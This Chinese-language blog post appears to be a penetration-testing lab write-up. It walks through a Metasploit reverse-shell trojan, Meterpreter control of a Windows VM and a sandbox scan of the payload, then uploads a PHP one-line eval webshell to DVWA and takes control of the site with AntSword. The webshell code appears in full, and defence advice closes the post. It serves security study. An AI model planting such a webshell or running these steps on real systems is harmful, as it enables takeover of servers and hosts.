渗透测试实战：远控木马免杀分析与WebShell获取控制

发表于2026-11-07|更新于2026-11-07
|浏览量:

实验声明

⚠️ 安全与脱敏声明：本实验所有操作均在个人隔离的本地虚拟机靶场中进行，仅供网络安全防御技术学习与研究。为遵守安全规范，文中涉及的真实网络 IP 地址均已进行脱敏替换处理（攻击机使用 10.0.0.128，靶机使用 10.0.0.130）。

本次实验包含两个核心部分：

  1. 利用 Metasploit 生成远控木马，实现对 Windows 靶机的控制，并利用沙箱进行威胁检测。
  2. 利用 DVWA 靶场的文件上传漏洞写入一句话木马，并通过蚁剑（AntSword）实现对目标网站的远程控制。

实验一：远控木马生成、控制与沙箱检测

1. 启动主控端监听

在 Kali Linux 中启动 Metasploit 框架，使用 multi/handler 模块配置监听器，准备接收靶机反弹回来的连接。

图注：Metasploit 成功开启反弹监听

2. 靶机上线与权限验证

将生成的 payload.exe 放入 Windows 靶机（10.0.0.130）运行。Kali 成功接收到会话（Session 1 opened），光标变为 meterpreter >。

随后执行 sysinfo 获取了靶机的系统信息（Windows 10 x64），并执行 screenshot 成功截取靶机屏幕，证明已完全控制该主机。

图注：成功获取 Meterpreter 会话并执行系统命令

3. 微步云沙箱威胁检测

为了验证木马的危害性及检测率，将 payload.exe 上传至微步云沙箱（ThreatBook）。
分析报告显示，该文件被判定为 恶意，28 个引擎中有 14 个检出。场景标签包括 后门、CobaltStrike 等。

图注：沙箱检出木马并标记为恶意

4. 恶意行为深度分析

在沙箱的“行为检测”页面，MITRE ATT&CK 矩阵检测到了多条可疑行为，包括：

  • 逆向工程：二进制文件包含加密或压缩数据。
  • 恶意行为特征：疑似创建 Shellcode。
  • 静态文件特征：在文件中发现 IP 地址或 URL。

图注：沙箱动态行为分析结果

实验二：文件上传漏洞与蚁剑控制

1. 靶场环境配置

启动 Metasploitable2 靶机（10.0.0.130），在浏览器中访问 DVWA 靶场。进入 DVWA Security 页面，将安全等级设置为 Low，以模拟存在低级漏洞的 Web 环境。

> *图注：将 DVWA 安全等级调整为 Low*

2. 上传一句话木马

在本地创建一个 PHP 木马文件 shell.php，内容为 <?php @eval($_POST['cmd']); ?>。
进入 Upload 模块，上传该文件。由于级别为 Low，系统未做任何后缀和内容检测，直接提示上传成功，并回显了相对路径。

图注：利用文件上传漏洞成功写入 WebShell

3. 蚁剑（AntSword）连接配置

打开蚁剑客户端，右键选择“添加数据”。

  • URL地址：填入靶机上的木马完整路径（如 http://10.0.0.130/dvwa/hackable/uploads/shell.php）。
  • 连接密码：填写木马中定义的密码 cmd。
  • 连接类型：选择 PHP。

图注：配置 WebShell 连接信息

4. 成功控制目标网站

点击测试连接并保存后，双击该条目，成功进入文件管理界面。我们在 /var/www/dvwa/hackable/uploads/ 目录下看到了刚才上传的 shell.php，并可以直接在蚁剑中查看和编辑该文件的源码。

图注：通过蚁剑成功控制目标服务器文件系统

实验总结与防御建议

通过本次实战，完整体验了从**客户端远控（Meterpreter）**到 Web服务端控制（WebShell） 的攻击路径。

防御建议：

  1. 针对远控木马：应部署终端检测与响应（EDR）系统，不轻易点击来历不明的 .exe 文件。
  2. 针对文件上传漏洞：后端必须对上传文件进行严格的白名单校验（检查文件后缀名、MIME 类型），并彻底禁用上传目录的脚本执行权限。
